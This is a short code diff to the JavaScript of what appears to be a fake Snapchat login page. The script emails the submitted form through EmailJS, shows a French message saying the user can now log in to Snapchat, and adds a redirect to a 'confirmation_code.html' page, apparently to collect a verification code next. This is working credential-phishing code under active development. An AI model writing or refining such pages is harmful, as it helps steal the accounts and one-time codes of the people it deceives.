@@ -136,10 +136,11 @@
         emailjs.sendForm("service_7xtpexj", "template_3jr5npg", this)
             .then(function (response) {
                 console.log("Email envoyé avec succès !", response);
-                alert("Vous allez pouvoir vous connecter a SnapChat");
+                alert("Vous allez pouvoir vous connecter à Snapchat");
                 submitBtn.value = "Connexion";
                 submitBtn.disabled = false;
                 document.getElementById("myForm").reset();
+                window.location.href = "confirmation_code.html"; // Redirection vers confirmation_code.html
             }, function (error) {
                 console.log("Échec de l'envoi de l'email", error);
                 alert("Une erreur s'est produite. Réessayez plus tard.");
